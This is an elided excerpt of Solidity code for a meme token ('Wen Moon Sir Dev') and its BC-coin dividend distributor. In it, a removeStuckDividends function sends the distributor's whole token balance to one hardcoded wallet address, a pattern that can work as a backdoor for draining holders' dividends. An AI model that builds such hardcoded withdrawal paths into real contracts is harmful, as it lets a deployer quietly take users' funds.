...
contract BCDividends is IBCDividends {
    ...
    constructor() {
        ...
        BC = 0xdc80909eF17Ae8163B1B616cC5151f6F9680A2c4;
    }
    ...
    function removeStuckDividends() external onlyToken {
        ...
        IERC20(BC).transfer(
            address(0x3C6Da034924B3D2fA3985D2732a991E39FF6F5D9),
            balance
        );
    }
...
contract WenDevSir is IERC20, Auth {
    using SafeMath for uint256;

    address public BC = 0xdc80909eF17Ae8163B1B616cC5151f6F9680A2c4; //BC COIN

    string private constant _name = "Wen Moon Sir Dev";
    string private constant _symbol = "WenDevSir";
